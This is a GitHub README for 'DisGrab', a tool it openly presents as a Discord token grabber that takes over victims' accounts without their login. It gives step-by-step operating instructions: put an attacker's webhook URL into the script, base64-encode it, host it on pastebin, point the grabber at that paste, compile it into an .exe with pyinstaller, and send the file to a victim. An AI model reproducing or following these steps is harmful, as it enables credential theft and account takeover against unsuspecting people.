# DisGrab - Discord Token Grabber
> Once ran it grabs the users discord token. Can be used to access the victims discord account without their login.

![](https://i.imgur.com/ZcT5Tu4.png)

---
## Table Of Contents
- [Installation](#Installation)
- [How To Use](#How-To-Use)
- [Developer Information](#Developer-Contact)
- [License](#License)
---
## Installation
- Download Python 3 - python.org
- Download the contents of the github repo.
- Install the modules needed in the requirements.txt `pip install requirements.txt`
---
## How To Use
- First complete the [installation](#Installation).
- Open encrypt.py, edit `WEBHOOK_URL` to your webhook url. Then run the script `python encrypt.py` It will print a base64 payload something like this `aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvNzY2NzcxODA0Nzk0Mzg4NTIxL1JIU0NWTHAzMnZNeDUzQVBFQUVaSHNWOFhsUXVyeDYyVVRzQz`
- Grab that and upload it to pastebin then get the ID of your paste. `https://pastebin.com/raw/8RinP9` - `8RinP9` is the ID of the paste simply replace it in the grabber.py file on line 5. Example: Line 5 would look like this `PASTEBIN_URL = "https://pastebin.com/raw/8RinP9"`

### Compile The Script
- In the same directory as the script compile it with py installer. `pyinstaller --onefile grabber.py`<br>Now you have the .exe file send it to your victim.    

---
## License
MIT License

Copyright (c) [2020] [Sympthey]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

[Back To The Top](#DisGrab---Discord-Token-Grabber)

---
## Developer Contact:
[Youtube](https://www.youtube.com/channel/UCG-oO6m-iOuonFUbk6HU67w?view_as=subscriber)

[Instagram](https://www.instagram.com/Sympthey/)

[Twitter](https://twitter.com/Sympthey)

Discord: Sympthey#9640

## Project Ideas?
If you have any ideas or improvements I can make to my repos message me on any of my social media.

[Back To The Top](#DisGrab---Discord-Token-Grabber)